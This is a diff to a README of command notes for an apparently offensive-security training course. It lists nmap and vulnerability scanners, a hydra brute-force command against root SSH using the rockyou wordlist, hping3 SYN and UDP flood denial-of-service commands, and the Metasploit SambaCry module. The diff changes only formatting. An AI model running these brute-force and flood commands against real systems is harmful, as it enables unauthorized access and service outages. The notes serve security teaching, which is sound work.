@@ -1,19 +1,19 @@
-# list-command-Offensive-Detection-course
+# List command - Offensive & Detection Course
 List command that used in Offensive &amp; Detection Course
 
 # Service Exploitation
 ## scan network & VA
-nmap -P0 <IP>
-openvas
-nessus
+nmap -P0 <IP>  
+openvas  
+nessus  
   
 ## bruteforcing
-hydra-wizard
-hydra -l root -P /usr/share/wordlists/rockyou.txt -u  -s 22  <IP> ssh
+hydra-wizard  
+hydra -l root -P /usr/share/wordlists/rockyou.txt -u  -s 22  <IP> ssh  
   
 ## DoS
-TCP(SYN Flood): hping3 -S -L -w --flood -p 80 <TARGET>
-UDP(Volume Based Attack) : hping3 --UDP --flood -p 80 <TARGET>
+TCP(SYN Flood): hping3 -S -L -w --flood -p 80 <TARGET>  
+UDP(Volume Based Attack) : hping3 --UDP --flood -p 80 <TARGET>  
   
 ## Sambacry
 (metasploit) exploit/linux/samba/is_known_pipename
